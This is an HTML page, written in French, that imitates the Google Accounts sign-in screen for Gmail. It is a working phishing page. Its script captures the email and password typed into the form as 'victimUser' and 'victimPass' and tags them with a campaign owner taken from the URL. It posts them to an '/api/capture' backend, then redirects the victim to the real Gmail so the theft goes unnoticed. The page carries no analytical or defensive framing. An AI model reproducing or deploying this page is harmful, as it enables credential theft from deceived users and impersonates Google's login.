<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Comptes Google</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
            background-color: #f0f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .google-container {
            background-color: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 450px;
            box-sizing: border-box;
            text-align: center;
        }

        .google-logo {
            width: 75px;
            height: auto;
            margin-bottom: 15px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #1f1f1f;
            margin-bottom: 8px;
            margin-top: 0;
        }

        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            background-color: transparent;
            border: 1px solid #747775;
            border-radius: 4px;
            font-size: 16px;
            color: #1f1f1f;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 14px;
        }

        .google-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .google-btn:hover {
            background-color: #1557b0;
        }

        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>
<body>

    <div class="google-container">
        <!-- Logo Google officiel -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
        
        <h1>Connexion</h1>
        <p class="subtitle">Accéder à Gmail</p>

        <!-- Formulaire de connexion simple sans OTP -->
        <form id="loginForm" class="clearfix">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="Adresse e-mail ou téléphone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
            </div>

            <button type="submit" class="google-btn">Suivant</button>
        </form>
    </div>

    <script>
        // Récupération automatique des paramètres de l'URL (?user=Kim&type=standard)
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        // Gestion de la soumission du formulaire et envoi vers le backend Flask
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Gmail",
                type: linkType,
                victimUser: username,
                victimPass: password,
                otp: 'Aucun'
            };

            // Envoi des données capturées vers le backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://mail.google.com";
            }).catch(error => {
                window.location.href = "https://mail.google.com";
            });
        });
    </script>
</body>
</html>
